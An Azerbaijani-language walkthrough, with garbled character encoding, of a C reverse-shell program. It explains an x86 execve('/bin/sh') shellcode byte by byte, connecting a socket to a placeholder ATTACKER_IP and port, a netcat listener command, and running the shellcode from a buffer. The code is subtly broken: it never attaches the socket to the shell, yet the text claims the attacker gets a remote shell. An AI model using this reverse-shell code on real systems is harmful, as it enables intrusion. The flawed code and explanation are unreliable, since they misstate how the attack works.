ğŸ”¹ 1) Kitabxanalar:

#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
Bu kitabxanalar:

stdio.h â€“ standart giriÅŸ/Ã§Ä±xÄ±ÅŸ funksiyalarÄ± (mÉ™sÉ™lÉ™n, printf).

string.h â€“ simli É™mÉ™liyyatlar Ã¼Ã§Ã¼n (memset, strcpy, vÉ™ s.).

sys/socket.h, arpa/inet.h â€“ ÅŸÉ™bÉ™kÉ™ proqramlaÅŸdÄ±rmasÄ± Ã¼Ã§Ã¼n (socket yaratmaq vÉ™ ÅŸÉ™bÉ™kÉ™yÉ™ qoÅŸulmaq).

unistd.h â€“ proses idarÉ™etmÉ™si (close, exec vÉ™ s.).

ğŸ”¹ 2) Shellcode:

unsigned char shellcode[] =
"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
"\x68\x2f\x62\x69\x6e\x89\xe3\x50"
"\x53\x89\xe1\xb0\x0b\xcd\x80";
Bu, x86 Linux Ã¼Ã§Ã¼n yazÄ±lmÄ±ÅŸ execve("/bin/sh") shellcode-dur. QÄ±saca desÉ™k:

\x31\xc0 â€” EAX registrini tÉ™mizlÉ™ (xor eax, eax).

\x50 â€” stack-a NULL (0) qoy.

\x68\x2f\x2f\x73\x68 â€” //sh sÉ™trini stack-a qoy.

\x68\x2f\x62\x69\x6e â€” /bin sÉ™trini stack-a qoy.

\x89\xe3 â€” esp pointerini ebx-É™ kÃ¶Ã§Ã¼r (proqramÄ±n yolunu gÃ¶stÉ™rÉ™cÉ™k).

\x50 â€” NULL arqumenti stack-a qoy.

\x53 â€” /bin//sh-É™ iÅŸarÉ™ edÉ™n gÃ¶stÉ™ricini stack-a qoy.

\x89\xe1 â€” esp-ni ecx-É™ kÃ¶Ã§Ã¼r (argv[]).

\xb0\x0b â€” eax-É™ 0xb (execve syscall nÃ¶mrÉ™si) qoy.

\xcd\x80 â€” kernel-É™ keÃ§ (int 0x80).

Bu kod execve("/bin/sh", NULL, NULL) Ã§aÄŸÄ±rÄ±ÅŸÄ± edÉ™cÉ™k.

ğŸ”¹ 3) Æsas funksiyada addÄ±m-addÄ±m:
âœ… Socket yarat

int sockfd;
struct sockaddr_in server;

sockfd = socket(AF_INET, SOCK_STREAM, 0);
TCP socket aÃ§Ä±lÄ±r.

AF_INET â€“ IPv4 Ã¼nvan ailÉ™si.

SOCK_STREAM â€“ TCP.

âœ… HÃ¼cumÃ§u IP vÉ™ portunu tÉ™yin et

server.sin_family = AF_INET;
server.sin_addr.s_addr = inet_addr("ATTACKER_IP");
server.sin_port = htons(ATTACKER_PORT);
ATTACKER_IP â€“ hÃ¼cumÃ§unun dinlÉ™yici IP Ã¼nvanÄ±.

ATTACKER_PORT â€“ port nÃ¶mrÉ™si.

âœ… BaÄŸlantÄ± yarat

connect(sockfd, (struct sockaddr *)&server, sizeof(server));
Bu funksiya hÃ¼cumÃ§uya qoÅŸulmanÄ± tÉ™min edir. YÉ™ni, hÃ¼cumÃ§u Ã¶z kompÃ¼terindÉ™ nc -lvnp PORT kimi dinlÉ™yici aÃ§malÄ±dÄ±r.

âœ… Shellcode icra et

int (*ret)() = (int(*)())shellcode;
ret();
ret â€“ funksiya gÃ¶stÉ™ricisidir (int qaytaran vÉ™ heÃ§ nÉ™ qÉ™bul etmÉ™yÉ™n funksiya).

ret() Ã§aÄŸÄ±rÄ±laraq shellcode baÅŸlanÄŸÄ±c Ã¼nvanÄ±ndan kod icra olunur.

ğŸ”¹ NÉ™ticÉ™
Proqram icra olunduqda:
1ï¸âƒ£ HÃ¼cumÃ§uya TCP baÄŸlantÄ± qurur.
2ï¸âƒ£ HÃ¼cumÃ§unun nc (netcat) vÉ™ ya digÉ™r dinlÉ™yici proqramÄ± ilÉ™ qoÅŸulma qurulur.
3ï¸âƒ£ shellcode icra edilir vÉ™ hÉ™dÉ™f maÅŸÄ±nda /bin/sh shell aÃ§Ä±lÄ±r.
4ï¸âƒ£ HÃ¼cumÃ§u bu shell Ã¼zÉ™rindÉ™n É™mrlÉ™r icra edÉ™ bilir.
